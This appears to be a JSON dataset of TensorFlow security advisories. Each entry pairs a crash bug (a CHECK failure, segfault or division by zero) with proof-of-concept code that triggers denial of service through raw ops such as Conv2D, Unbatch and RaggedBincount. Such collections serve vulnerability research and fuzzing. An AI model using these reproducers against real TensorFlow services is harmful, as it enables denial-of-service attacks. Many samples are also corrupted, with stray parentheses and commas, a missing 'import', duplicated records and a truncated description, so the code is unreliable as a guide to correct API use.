[
  {
    "Title": "\n        `CHECK` fail in `QuantizeAndDequantizeV3`\n      ",
    "Bug description": "If  QuantizeAndDequantizeV3  is given a nonscalar  num_bits  input tensor, it results in a  CHECK  fail that can be used to trigger a denial of service attack.",
    "Sample Code": "signed_input = True\nrange_given = False\nnarrow_range = False\naxis = -1\ninput = tf.constant(-3.5, shape=[1], dtype=tf.float32)\ninput_min = tf.constant(-3.5, shape=[1], dtype=tf.float32)\ninput_max = tf.constant(-3.5, shape=[1], dtype=tf.float32)\nnum_bits = tf.constant([], shape=[0], dtype=tf.int32)\n)\ntf.raw_ops.QuantizeAndDequantizeV3(input=input, input_min=input_min, input_max=input_max, num_bits=num_bits, signed_input=signed_input, range_given=range_given, narrow_range=narrow_range, axis=axis)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9cr2-8pwr-fhfq",
    "API Signature": "tf.raw_ops.QuantizeAndDequantizeV3(\n    input,\n    input_min,\n    input_max,\n    num_bits,\n    signed_input=True,\n    range_given=True,\n    narrow_range=False,\n    axis=-1,\n    name=None\n)\n"
  },
  {
    "Title": "\n        `CHECK` fail in `FakeQuantWithMinMaxVarsGradient`\n      ",
    "Bug description": "When  tf.quantization.fake_quant_with_min_max_vars_gradient  receives input  min  or  max  that is nonscalar, it gives a  CHECK  fail that can trigger a denial of service attack.",
    "Sample Code": "import numpy as np \narg_0=tf.constant(value=np.random.random(size=(2, 2)), shape=(2, 2), dtype=tf.float32)\narg_1=tf.constant(value=np.random.random(size=(2, 2)), shape=(2, 2), dtype=tf.float32)\narg_2=tf.constant(value=np.random.random(size=(2, 2)), shape=(2, 2), dtype=tf.float32)\narg_3=tf.constant(value=np.random.random(size=(2, 2)), shape=(2, 2), dtype=tf.float32)\narg_4=8\narg_5=False\narg_6=''\ntf.quantization.fake_quant_with_min_max_vars_gradient(gradients=arg_0, inputs=arg_1,\n,\nmin=arg_2, max=arg_3, num_bits=arg_4, narrow_range=arg_5, name=arg_6)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-r26c-679w-mrjm",
    "API Signature": "tf.quantization.fake_quant_with_min_max_vars_gradient(\n    gradients, inputs, min, max, num_bits=8, narrow_range=False, name=None\n)\n"
  },
  {
    "Title": "\n        `CHECK` fail in `tf.random.gamma`\n      ",
    "Bug description": "When  tf.random.gamma  receives large input shape and rates, it gives a  CHECK  fail that can trigger a denial of service attack.",
    "Sample Code": "arg_0=tf.random.uniform(shape=(4,), dtype=tf.int32, maxval=65536)\narg_1=tf.random.uniform(shape=(4, 4), dtype=tf.float64, maxval=None)\narg_2=tf.random.uniform(shape=(4, 4, 4, 4, 4), dtype=tf.float64, maxval=None)\narg_3=tf.float64\narg_4=48\narg_5='None'\n\ntf.random.gamma(shape=arg_0, alpha=arg_1, beta=arg_2, dtype=arg_3, seed=arg_4, name=arg_5)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-mv8m-8x97-937q",
    "API Signature": "tf.random.gamma(\n    shape,\n    alpha,\n    beta=None,\n    dtype=tf.dtypes.float32,\n    seed=None,\n    name=None\n)\n"
  },
  {
    "Title": "\n        `CHECK` fail in `RandomPoissonV2`\n      ",
    "Bug description": "When  RandomPoissonV2  receives large input shape and rates, it gives a  CHECK  fail that can trigger a denial of service attack.",
    "Sample Code": "arg_0=tf.random.uniform(shape=(4,), dtype=tf.int32, maxval=65536)\narg_1=tf.random.uniform(shape=(4, 4, 4, 4, 4), dtype=tf.float32, maxval=None)\narg_2=0\narg_3=0\narg_4=tf.int32\narg_5=None\ntf.raw_ops.RandomPoissonV2(shape=arg_0, rate=arg_1, seed=arg_2,\n                           ,\n                           seed2=arg_3, dtype=arg_4, name=arg_5)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-cv2p-32v3-vhwq",
    "API Signature": "tf.raw_ops.RandomPoissonV2(\n    shape,\n    rate,\n    seed=0,\n    seed2=0,\n    dtype=tf.dtypes.int64,\n    name=None\n)\n"
  },
  {
    "Title": "\n        `CHECK` fail in `Unbatch`\n      ",
    "Bug description": "When  Unbatch  receives a nonscalar input  id , it gives a  CHECK  fail that can trigger a denial of service attack.",
    "Sample Code": "import numpy as np\narg_0=tf.constant(value=np.random.random(size=(3, 3, 1)), dtype=tf.float64)\narg_1=tf.constant(value=np.random.randint(0,100,size=(3, 3, 1)), dtype=tf.int64)\narg_2=tf.constant(value=np.random.randint(0,100,size=(3, 3,  1)), dtype=tf.int64)\narg_3=47\narg_4=''\narg_5=''\ntf.raw_ops.Unbatch(batched_tensor=arg_0, batch_index=arg_1, id=arg_2, \n                   , \n                   timeout_micros=arg_3, container=arg_4, shared_name=arg_5)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-mh3m-62v7-68xg",
    "API Signature": "tf.raw_ops.Unbatch(\n    batched_tensor,\n    batch_index,\n    id,\n    timeout_micros,\n    container='',\n    shared_name='',\n    name=None\n)\n"
  },
  {
    "Title": "\n        `CHECK` fail in `DrawBoundingBoxes`\n      ",
    "Bug description": "When  DrawBoundingBoxes  receives an input  boxes  that is not of dtype  float , it gives a  CHECK  fail that can trigger a denial of service attack.",
    "Sample Code": "import numpy as np\narg_0=tf.constant(value=np.random.random(size=(1, 3, 2, 3)), shape=(1, 3, 2, 3), dtype=tf.half)\narg_1=tf.constant(value=np.random.random(size=(1, 2, 4)), shape=(1, 2, 4), dtype=tf.float32)\narg_2=''\n\ntf.raw_ops.DrawBoundingBoxes(images=arg_0, boxes=arg_1, name=arg_2)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-jqm7-m5q7-3hm5",
    "API Signature": "tf.raw_ops.DrawBoundingBoxes(\n    images, boxes, name=None\n)\n"
  },
  {
    "Title": "\n        `CHECK` fail in `Eig`\n      ",
    "Bug description": "Eig  can be fed an incorrect  Tout  input, resulting in a  CHECK  fail that can trigger a denial of service attack.",
    "Sample Code": "import numpy as np \narg_0=tf.constant(value=np.random.random(size=(2, 2)), shape=(2, 2), dtype=tf.float32)\narg_1=tf.complex128\narg_2=True\narg_3=''\n\ntf.raw_ops.Eig(input=arg_0, Tout=arg_1, compute_v=arg_2, name=arg_3)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-fqxc-pvf8-2w9v",
    "API Signature": "tf.raw_ops.Eig(\n    input, Tout, compute_v=True, name=None\n)\n"
  },
  {
    "Title": "\n        `CHECK` fail in `Conv2DBackpropInput`\n      ",
    "Bug description": "When  Conv2DBackpropInput  receives empty  out_backprop  inputs (e.g.  [3, 1, 0, 1] ), the current CPU/GPU kernels  CHECK  fail (one with dnnl, the other with cudnn). This can be used to trigger a denial of service attack.",
    "Sample Code": "import numpy as np\ninput_sizes = [3, 1, 1, 2]\nfilter = np.ones([1, 3, 2, 3])\nout_backprop = np.ones([3, 1, 0, 3])\nstrides = [1, 1, 2, 1]\npadding = 'VALID'\n\ntf.raw_ops.Conv2DBackpropInput(\n   input_sizes = input_sizes,\n   filter = filter,\n   out_backprop = out_backprop,\n   strides = strides,\n   padding = padding\n)\n)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-37jf-mjv6-xfqw",
    "API Signature": "tf.raw_ops.Conv2DBackpropInput(\n    input_sizes,\n    filter,\n    out_backprop,\n    strides,\n    padding,\n    use_cudnn_on_gpu=True,\n    explicit_paddings=[],\n    data_format='NHWC',\n    dilations=[1, 1, 1, 1],\n    name=None\n)\n"
  },
  {
    "Title": "\n        `CHECK` fail in `EmptyTensorList`\n      ",
    "Bug description": "If  EmptyTensorList  receives an input  element_shape  with more than one dimension, it gives a  CHECK  fail that can be used to trigger a denial of service attack.",
    "Sample Code": " tensorflow as tf\n\ntf.raw_ops.EmptyTensorList(element_shape=tf.ones(dtype=tf.int32, shape=[1, 0]), max_num_elements=tf.constant(1),element_dtype=tf.int32)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-qhw4-wwr7-gjc5",
    "API Signature": "tf.raw_ops.EmptyTensorList(\n    element_shape, max_num_elements, element_dtype, name=None\n)\n"
  },
  {
    "Title": "\n        `CHECK` fail in `tf.sparse.cross`\n      ",
    "Bug description": "If  tf.sparse.cross  receives an input  separator  that is not a scalar, it gives a  CHECK  fail that can be used to trigger a denial of service attack.",
    "Sample Code": " tensorflow as tf\n\ntf.sparse.cross(inputs=[],name='a',separator=tf.constant(['a', 'b'],dtype=tf.string))",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-p7hr-f446-x6qf",
    "API Signature": "tf.sparse.cross(\n    inputs, name=None, separator=None\n)\n"
  },
  {
    "Title": "\n        Floating point exception in `Conv2D`\n      ",
    "Bug description": "If  Conv2D  is given empty  input  and the  filter  and  padding  sizes are valid, the output is all-zeros. This causes division-by-zero floating point exceptions that can be used to trigger a denial of service attack.",
    "Sample Code": "import numpy as np\nwith tf.device(\"CPU\"): # also can be triggerred on GPU\n   input = np.ones([1, 0, 2, 1])\n   filter = np.ones([1, 1, 1, 1])\n   strides = ([1, 1, 1, 1])\n   padding = \"EXPLICIT\"\n   explicit_paddings = [0 , 0, 1, 1, 1, 1, 0, 0]\n   data_format = \"NHWC\"\n   res = tf.raw_ops.Conv2D(\n       input=input,\n       filter=filter,\n       strides=strides,\n       padding=padding,\n        explicit_paddings=explicit_paddings,\n       data_format=data_format,\n  ),\n  )",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-q5jv-m6qw-5g37",
    "API Signature": "tf.raw_ops.Conv2D(\n    input,\n    filter,\n    strides,\n    padding,\n    use_cudnn_on_gpu=True,\n    explicit_paddings=[],\n    data_format='NHWC',\n    dilations=[1, 1, 1, 1],\n    name=None\n)\n"
  },
  {
    "Title": "\n        `CHECK` fail in `AudioSummaryV2`\n      ",
    "Bug description": "When  AudioSummaryV2  receives an input  sample_rate  with more than one element, it gives a  CHECK  fails that can be used to trigger a denial of service attack.",
    "Sample Code": "arg_0=''\narg_1=tf.random.uniform(shape=(1,1), dtype=tf.float32, maxval=None)\narg_2=tf.random.uniform(shape=(2,1), dtype=tf.float32, maxval=None)\narg_3=3\narg_4=''\ntf.raw_ops.AudioSummaryV2(tag=arg_0, tensor=arg_1, sample_rate=arg_2,\n                          ,\n                          max_outputs=arg_3, name=arg_4)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-g9h5-vr8m-x2h4",
    "API Signature": "tf.raw_ops.AudioSummaryV2(\n    tag, tensor, sample_rate, max_outputs=3, name=None\n)\n"
  },
  {
    "Title": "\n        `CHECK` fail in `CollectiveGather`\n      ",
    "Bug description": "When  CollectiveGather  receives an scalar input  input , it gives a  CHECK  fails that can be used to trigger a denial of service attack.",
    "Sample Code": "arg_0=1\narg_1=1\narg_2=1\narg_3=1\narg_4=(3, 3,3)\narg_5='auto'\narg_6=0\narg_7=''\ntf.raw_ops.CollectiveGather(input=arg_0, group_size=arg_1, group_key=arg_2,\n                            instance_key=arg_3, shape=arg_4,\n                            ,\n                            communication_hint=arg_5, timeout_seconds=arg_6, name=arg_7)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-fhfc-2q7x-929f",
    "API Signature": "tf.raw_ops.CollectiveGather(\n    input,\n    group_size,\n    group_key,\n    instance_key,\n    shape,\n    communication_hint='auto',\n    timeout_seconds=0,\n    name=None\n)\n"
  },
  {
    "Title": "\n        `CHECK` fail in `SetSize`\n      ",
    "Bug description": "When  SetSize  receives an input  set_shape  that is not a 1D tensor, it gives a  CHECK  fails that can be used to trigger a denial of service attack.",
    "Sample Code": "arg_0=1\narg_1=[1,1]\narg_2=1\narg_3=True\narg_4=''\ntf.raw_ops.SetSize(set_indices=arg_0, set_values=arg_1, set_shape=arg_2,\n                   ,\n                   validate_indices=arg_3, name=arg_4)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-wq6q-6m32-9rv9",
    "API Signature": "tf.raw_ops.SetSize(\n    set_indices, set_values, set_shape, validate_indices=True, name=None\n)\n"
  },
  {
    "Title": "\n        `CHECK` fail in `TensorListFromTensor`\n      ",
    "Bug description": "When  TensorListFromTensor  receives an  element_shape  of a rank greater than one, it gives a  CHECK  fail that can trigger a denial of service attack.",
    "Sample Code": "arg_0=tf.random.uniform(shape=(6, 6, 2), dtype=tf.bfloat16, maxval=None)\narg_1=tf.random.uniform(shape=(6, 9, 1, 3), dtype=tf.int64, maxval=65536)\narg_2=''\n\ntf.raw_ops.TensorListFromTensor(tensor=arg_0, element_shape=arg_1, name=arg_2)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9v8w-xmr4-wgxp",
    "API Signature": "tf.raw_ops.TensorListFromTensor(\n    tensor, element_shape, name=None\n)\n"
  },
  {
    "Title": "\n        `CHECK` fail in `TensorListScatter` and `TensorListScatterV2`\n      ",
    "Bug description": "When  TensorListScatter  and  TensorListScatterV2  receive an  element_shape  of a rank greater than one, they give a  CHECK  fail that can trigger a denial of service attack.",
    "Sample Code": "arg_0=tf.random.uniform(shape=(2, 2, 2), dtype=tf.float16, maxval=None)\narg_1=tf.random.uniform(shape=(2, 2, 2), dtype=tf.int32, maxval=65536)\narg_2=tf.random.uniform(shape=(2, 2, 2), dtype=tf.int32, maxval=65536)\narg_3=''\ntf.raw_ops.TensorListScatter(tensor=arg_0, indices=arg_1, \n, \nelement_shape=arg_2, name=arg_3)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-vm7x-4qhj-rrcq",
    "API Signature": "tf.raw_ops.TensorListScatter(\n    tensor, indices, element_shape, name=None\n)\n"
  },
  {
    "Title": "\n        `CHECK` fail in `TensorListScatter` and `TensorListScatterV2`\n      ",
    "Bug description": "When  TensorListScatter  and  TensorListScatterV2  receive an  element_shape  of a rank greater than one, they give a  CHECK  fail that can trigger a denial of service attack.",
    "Sample Code": "arg_0=tf.random.uniform(shape=(2, 2, 2), dtype=tf.float16, maxval=None)\narg_1=tf.random.uniform(shape=(2, 2, 2), dtype=tf.int32, maxval=65536)\narg_2=tf.random.uniform(shape=(2, 2, 2), dtype=tf.int32, maxval=65536)\narg_3=''\ntf.raw_ops.TensorListScatter(tensor=arg_0, indices=arg_1, \n, \nelement_shape=arg_2, name=arg_3)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-vm7x-4qhj-rrcq",
    "API Signature": "tf.raw_ops.TensorListScatterV2(\n    tensor, indices, element_shape, num_elements, name=None\n)\n"
  },
  {
    "Title": "\n        `CHECK` fail in `FakeQuantWithMinMaxVarsPerChannelGradient`\n      ",
    "Bug description": "When  tf.quantization.fake_quant_with_min_max_vars_per_channel_gradient  receives input  min  or  max  of rank other than 1, it gives a  CHECK  fail that can trigger a denial of service attack.",
    "Sample Code": "arg_0=tf.random.uniform(shape=(1,1), dtype=tf.float32, maxval=None)\narg_1=tf.random.uniform(shape=(1,1), dtype=tf.float32, maxval=None)\narg_2=tf.random.uniform(shape=(1,1), dtype=tf.float32, maxval=None)\narg_3=tf.random.uniform(shape=(1,1), dtype=tf.float32, maxval=None)\narg_4=8\narg_5=False\narg_6=None\ntf.quantization.fake_quant_with_min_max_vars_per_channel_gradient(gradients=arg_0, \n            inputs=arg_1, min=arg_2,  max=arg_3, num_bits=arg_4, \n            , \n            narrow_range=arg_5, name=arg_6)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-h7ff-cfc9-wmmh",
    "API Signature": "tf.quantization.fake_quant_with_min_max_vars_per_channel_gradient(\n    gradients, inputs, min, max, num_bits=8, narrow_range=False, name=None\n)\n"
  },
  {
    "Title": "\n        `CHECK` fail in `MaxPool`\n      ",
    "Bug description": "When  MaxPool  receives a window size input array  ksize  with dimensions greater than its input tensor  input , the GPU kernel gives a  CHECK  fail that can be used to trigger a denial of service attack.",
    "Sample Code": "import numpy as np\n\ninput = np.ones([1, 1, 1, 1])\nksize = [1, 1, 2, 2]\nstrides = [1, 1, 1, 1]\npadding = 'VALID'\ndata_format = 'NCHW'\n\n\n\ntf.raw_ops.MaxPool(input=input, ksize=ksize, strides=strides, padding=padding, data_format=data_format)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-j43h-pgmg-5hjq",
    "API Signature": "tf.raw_ops.MaxPool(\n    input,\n    ksize,\n    strides,\n    padding,\n    explicit_paddings=[],\n    data_format='NHWC',\n    name=None\n)\n"
  },
  {
    "Title": "\n        `CHECK` fail in `tf.linalg.matrix_rank`\n      ",
    "Bug description": "When  tf.linalg.matrix_rank  receives an empty input  a , the GPU kernel gives a  CHECK  fail that can be used to trigger a denial of service attack.",
    "Sample Code": "a = tf.constant([], shape=[0, 1, 1], dtype=tf.float32)\n)\ntf.linalg.matrix_rank(a=a)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9vqj-64pv-w55c",
    "API Signature": "tf.linalg.matrix_rank(\n    a, tol=None, validate_args=False, name=None\n)\n"
  },
  {
    "Title": "\n        `CHECK` fail in `DenseBincount`\n      ",
    "Bug description": "DenseBincount  assumes its input tensor  weights  to either have the same shape as its input tensor  input  or to be length-0. A different  weights  shape will trigger a  CHECK  fail that can be used to trigger a denial of service attack.",
    "Sample Code": "binary_output = True\ninput = tf.random.uniform(shape=[0, 0], minval=-10000, maxval=10000, dtype=tf.int32, seed=-2460)\nsize = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.int32, seed=-10000)\nweights = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.float32, seed=-10000)\n)\ntf.raw_ops.DenseBincount(input=input, size=size, weights=weights, binary_output=binary_output)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-w62h-8xjm-fv49",
    "API Signature": "tf.raw_ops.DenseBincount(\n    input, size, weights, binary_output=False, name=None\n)\n"
  },
  {
    "Title": "\n        Segfault in `RaggedBincount`\n      ",
    "Bug description": "If  RaggedBincount  is given an empty input tensor  splits , it results in a segfault that can be used to trigger a denial of service attack.",
    "Sample Code": "binary_output = True\nsplits = tf.random.uniform(shape=[0], minval=-10000, maxval=10000, dtype=tf.int64, seed=-7430)\nvalues = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.int32, seed=-10000)\nsize = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.int32, seed=-10000)\nweights = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.float32, seed=-10000)\n)\ntf.raw_ops.RaggedBincount(splits=splits, values=values, size=size, weights=weights, binary_output=binary_output)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-wr9v-g9vf-c74v",
    "API Signature": "tf.raw_ops.RaggedBincount(\n    splits, values, size, weights, binary_output=False, name=None\n)\n"
  },
  {
    "Title": "\n        `CHECK` fail in `LRNGrad`\n      ",
    "Bug description": "If  LRNGrad  is given an  output_image  input tensor that is not 4-D, it results in a  CHECK  fail that can be used to trigger a denial of service attack.",
    "Sample Code": "depth_radius = 1\nbias = 1.59018219\nalpha = 0.117728651\nbeta = 0.404427052\ninput_grads = tf.random.uniform(shape=[4, 4, 4, 4], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2033)\ninput_image = tf.random.uniform(shape=[4, 4, 4, 4], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2033)\noutput_image = tf.random.uniform(shape=[4, 4, 4, 4, 4, 4], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2033)\n)\ntf.raw_ops.LRNGrad(input_grads=input_grads, input_image=input_image, output_image=output_image, depth_radius=depth_radius, bias=bias, alpha=alpha, beta=beta)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9942-r22v-78cp",
    "API Signature": "tf.raw_ops.LRNGrad(\n    input_grads,\n    input_image,\n    output_image,\n    depth_radius=5,\n    bias=1,\n    alpha=1,\n    beta=0.5,\n    name=None\n)\n"
  },
  {
    "Title": "\n        `CHECK` fail in `ParameterizedTruncatedNormal`\n      ",
    "Bug description": "ParameterizedTruncatedNormal  assumes  shape  is of type  int32 . A valid  shape  of type  int64  results in a mismatched type  CHECK  fail that can be used to trigger a denial of service attack.",
    "Sample Code": "seed = 1618\nseed2 = 0\nshape = tf.random.uniform(shape=[3], minval=-10000, maxval=10000, dtype=tf.int64, seed=4894)\nmeans = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)\nstdevs = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)\nminvals = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)\nmaxvals = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)\n)\ntf.raw_ops.ParameterizedTruncatedNormal(shape=shape, means=means, stdevs=stdevs, minvals=minvals, maxvals=maxvals, seed=seed, seed2=seed2)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-p2xf-8hgm-hpw5",
    "API Signature": "tf.raw_ops.ParameterizedTruncatedNormal(\n    shape, means, stdevs, minvals, maxvals, seed=0, seed2=0, name=None\n)\n"
  },
  {
    "Title": "\n        `CHECK` fail in `Save` and `SaveSlices`\n      ",
    "Bug description": "If  Save  or  SaveSlices  is run over tensors of an unsupported  dtype , it results in a  CHECK  fail that can be used to trigger a denial of service attack.",
    "Sample Code": "filename = tf.constant(\"\")\ntensor_names = tf.constant(\"\")\n# Save\ndata = tf.cast(tf.random.uniform(shape=[1], minval=-10000, maxval=10000, dtype=tf.int64, seed=-2021), tf.uint64)\ntf.raw_ops.Save(filename=filename, tensor_names=tensor_names, data=data, )\n# SaveSlices\nshapes_and_slices = tf.constant(\"\")\ndata = tf.cast(tf.random.uniform(shape=[1], minval=-10000, maxval=10000, dtype=tf.int64, seed=9712), tf.uint32)\n)\ntf.raw_ops.SaveSlices(filename=filename, tensor_names=tensor_names, shapes_and_slices=shapes_and_slices, data=data, )",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-m6vp-8q9j-whx4",
    "API Signature": "tf.raw_ops.Save(\n    filename, tensor_names, data, name=None\n)\n"
  },
  {
    "Title": "\n        `CHECK` fail in `Save` and `SaveSlices`\n      ",
    "Bug description": "If  Save  or  SaveSlices  is run over tensors of an unsupported  dtype , it results in a  CHECK  fail that can be used to trigger a denial of service attack.",
    "Sample Code": "filename = tf.constant(\"\")\ntensor_names = tf.constant(\"\")\n# Save\ndata = tf.cast(tf.random.uniform(shape=[1], minval=-10000, maxval=10000, dtype=tf.int64, seed=-2021), tf.uint64)\ntf.raw_ops.Save(filename=filename, tensor_names=tensor_names, data=data, )\n# SaveSlices\nshapes_and_slices = tf.constant(\"\")\ndata = tf.cast(tf.random.uniform(shape=[1], minval=-10000, maxval=10000, dtype=tf.int64, seed=9712), tf.uint32)\n)\ntf.raw_ops.SaveSlices(filename=filename, tensor_names=tensor_names, shapes_and_slices=shapes_and_slices, data=data, )",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-m6vp-8q9j-whx4",
    "API Signature": null
  },
  {
    "Title": "\n        Segfault in `SparseBincount`\n      ",
    "Bug description": "If  SparseBincount  is given inputs for  indices ,  values , and  dense_shape  that do not make a valid sparse tensor, it results in a segfault that can be used to trigger a denial of service attack.",
    "Sample Code": "binary_output = True\nindices = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.int64, seed=-1288)\nvalues = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.int32, seed=-9366)\ndense_shape = tf.random.uniform(shape=[0], minval=-10000, maxval=10000, dtype=tf.int64, seed=-9878)\nsize = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.int32, seed=-10000)\nweights = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.float32, seed=-10000)\n)\ntf.raw_ops.SparseBincount(indices=indices, values=values, dense_shape=dense_shape, size=size, weights=weights, binary_output=binary_output)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-397c-5g2j-qxpv",
    "API Signature": "tf.raw_ops.SparseBincount(\n    indices, values, dense_shape, size, weights, binary_output=False, name=None\n)\n"
  },
  {
    "Title": "\n        `CHECK` fail in `RaggedTensorToVariant`\n      ",
    "Bug description": "If  RaggedTensorToVariant  is given a  rt_nested_splits  list that contains tensors of ranks other than one, it results in a  CHECK  fail that can be used to trigger a denial of service attack.",
    "Sample Code": "batched_input = True\nrt_nested_splits = tf.constant([0,32,64], shape=[3], dtype=tf.int64)\nrt_dense_values = tf.constant([0,32,64], shape=[3], dtype=tf.int64)\n)\ntf.raw_ops.RaggedTensorToVariant(rt_nested_splits=rt_nested_splits, rt_dense_values=rt_dense_values, batched_input=batched_input)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-m6cv-4fmf-66xf",
    "API Signature": "tf.raw_ops.RaggedTensorToVariant(\n    rt_nested_splits, rt_dense_values, batched_input, name=None\n)\n"
  },
  {
    "Title": "\n        `CHECK` fail in `FractionalMaxPoolGrad`\n      ",
    "Bug description": "FractionalMaxPoolGrad  validates its inputs with  CHECK  failures instead of with returning errors. If it gets incorrectly sized inputs, the  CHECK  failure can be used to trigger a denial of service attack:",
    "Sample Code": "overlapping = True\norig_input = tf.constant(.453409232, shape=[1,7,13,1], dtype=tf.float32)\norig_output = tf.constant(.453409232, shape=[1,7,13,1], dtype=tf.float32)\nout_backprop = tf.constant(.453409232, shape=[1,7,13,1], dtype=tf.float32)\nrow_pooling_sequence = tf.constant(0, shape=[5], dtype=tf.int64)\ncol_pooling_sequence = tf.constant(0, shape=[5], dtype=tf.int64)\n)\ntf.raw_ops.FractionalMaxPoolGrad(orig_input=orig_input, orig_output=orig_output, out_backprop=out_backprop, row_pooling_sequence=row_pooling_sequence, col_pooling_sequence=col_pooling_sequence, overlapping=overlapping)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-vxv8-r8q2-63xw",
    "API Signature": "tf.raw_ops.FractionalMaxPoolGrad(\n    orig_input,\n    orig_output,\n    out_backprop,\n    row_pooling_sequence,\n    col_pooling_sequence,\n    overlapping=False,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Segfault in `QuantizedRelu` and `QuantizedRelu6`\n      ",
    "Bug description": "If  QuantizedRelu  or  QuantizedRelu6  are given nonscalar inputs for  min_features  or  max_features , it results in a segfault that can be used to trigger a denial of service attack.",
    "Sample Code": "out_type = tf.quint8\nfeatures = tf.constant(28, shape=[4,2], dtype=tf.quint8)\nmin_features = tf.constant([], shape=[0], dtype=tf.float32)\nmax_features = tf.constant(-128, shape=[1], dtype=tf.float32)\ntf.raw_ops.QuantizedRelu(features=features, min_features=min_features, max_features=max_features, out_type=out_type)\n)\ntf.raw_ops.QuantizedRelu6(features=features, min_features=min_features, max_features=max_features, out_type=out_type)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-v7vw-577f-vp8x",
    "API Signature": "tf.raw_ops.QuantizedRelu(\n    features,\n    min_features,\n    max_features,\n    out_type=tf.dtypes.quint8,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Segfault in `QuantizedRelu` and `QuantizedRelu6`\n      ",
    "Bug description": "If  QuantizedRelu  or  QuantizedRelu6  are given nonscalar inputs for  min_features  or  max_features , it results in a segfault that can be used to trigger a denial of service attack.",
    "Sample Code": "out_type = tf.quint8\nfeatures = tf.constant(28, shape=[4,2], dtype=tf.quint8)\nmin_features = tf.constant([], shape=[0], dtype=tf.float32)\nmax_features = tf.constant(-128, shape=[1], dtype=tf.float32)\ntf.raw_ops.QuantizedRelu(features=features, min_features=min_features, max_features=max_features, out_type=out_type)\n)\ntf.raw_ops.QuantizedRelu6(features=features, min_features=min_features, max_features=max_features, out_type=out_type)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-v7vw-577f-vp8x",
    "API Signature": "tf.raw_ops.QuantizedRelu6(\n    features,\n    min_features,\n    max_features,\n    out_type=tf.dtypes.quint8,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Segfault in `QuantizeDownAndShrinkRange`\n      ",
    "Bug description": "If  QuantizeDownAndShrinkRange  is given nonscalar inputs for  input_min  or  input_max , it results in a segfault that can be used to trigger a denial of service attack.",
    "Sample Code": "out_type = tf.quint8\ninput = tf.constant([1], shape=[3], dtype=tf.qint32)\ninput_min = tf.constant([], shape=[0], dtype=tf.float32)\ninput_max = tf.constant(-256, shape=[1], dtype=tf.float32)\n)\ntf.raw_ops.QuantizeDownAndShrinkRange(input=input, input_min=input_min, input_max=input_max, out_type=out_type)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-vgvh-2pf4-jr2x",
    "API Signature": "tf.raw_ops.QuantizeDownAndShrinkRange(\n    input, input_min, input_max, out_type, name=None\n)\n"
  },
  {
    "Title": "\n        Segfault in `QuantizedMatMul`\n      ",
    "Bug description": "If  QuantizedMatMul  is given nonscalar input for:",
    "Sample Code": "Toutput = tf.qint32\ntranspose_a = False\ntranspose_b = False\nTactivation = tf.quint8\na = tf.constant(7, shape=[3,4], dtype=tf.quint8)\nb = tf.constant(1, shape=[2,3], dtype=tf.quint8)\nmin_a = tf.constant([], shape=[0], dtype=tf.float32)\nmax_a = tf.constant(0, shape=[1], dtype=tf.float32)\nmin_b = tf.constant(0, shape=[1], dtype=tf.float32)\nmax_b = tf.constant(0, shape=[1], dtype=tf.float32)\n)\ntf.raw_ops.QuantizedMatMul(a=a, b=b, min_a=min_a, max_a=max_a, min_b=min_b, max_b=max_b, Toutput=Toutput, transpose_a=transpose_a, transpose_b=transpose_b, Tactivation=Tactivation)",
